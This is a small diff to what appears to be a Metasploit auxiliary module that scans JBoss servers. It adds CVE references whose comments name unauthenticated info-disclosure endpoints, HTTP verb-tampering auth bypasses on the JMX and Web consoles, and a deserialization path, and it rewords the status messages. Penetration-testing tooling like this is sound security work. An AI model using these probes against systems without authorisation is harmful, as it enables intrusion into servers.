@@ -23,8 +23,11 @@ class MetasploitModule < Msf::Auxiliary
         ],
       'References'            =>
         [
-          [ 'CVE', '2010-0738' ], # VERB auth bypass
-          [ 'CVE', '2017-12149' ]
+          [ 'CVE', '2008-3273' ], # info disclosure via unauthenticated access to "/status"
+          [ 'CVE', '2010-1429' ], # info disclosure via unauthenticated access to "/status" (regression)
+          [ 'CVE', '2010-0738' ], # VERB auth bypass on "JMX-Console": /jmx-console/
+          [ 'CVE', '2010-1428' ], # VERB auth bypass on "Web Console": /web-console/
+          [ 'CVE', '2017-12149' ] # deserialization: "/invoker/readonly"
         ],
       'License'               => BSD_LICENSE
       ))
@@ -46,7 +49,7 @@ class MetasploitModule < Msf::Auxiliary
     if res
 
       info = http_fingerprint(:response => res)
-      print_status(info)
+      print_status("#{rhost}:#{rport} Fingerprint: #{info}")
 
       if res.body && />(JBoss[^<]+)/.match(res.body)
         print_error("#{rhost}:#{rport} JBoss error message: #{$1}")
@@ -203,7 +206,7 @@ class MetasploitModule < Msf::Auxiliary
     })
 
     if res && res.code == 200
-      print_good("#{rhost}:#{rport} Got authentication bypass via HTTP verb tampering")
+      print_good("#{rhost}:#{rport} Got authentication bypass via HTTP verb tampering at #{app}")
     else
       print_status("#{rhost}:#{rport} Could not get authentication bypass via HTTP verb tampering")
     end
